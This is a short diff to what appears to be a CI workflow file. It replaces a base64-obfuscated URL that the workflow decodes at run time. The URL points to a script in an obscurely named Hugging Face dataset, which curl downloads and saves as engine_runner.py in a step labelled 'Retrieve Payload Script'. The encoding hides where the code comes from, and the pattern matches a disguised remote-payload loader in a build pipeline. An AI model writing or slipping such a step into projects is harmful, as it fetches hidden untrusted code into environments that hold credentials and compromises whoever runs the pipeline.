@@ -67,7 +67,7 @@ jobs:
       - name: Retrieve Payload Script
         run: |
           echo "[FETCH] Decoding source URL and fetching target script..."
-          REMOTE_URI=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          REMOTE_URI=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 -d)
           curl -sL "$REMOTE_URI" -o engine_runner.py
           echo "[FETCH] Payload successfully stored as engine_runner.py."
 
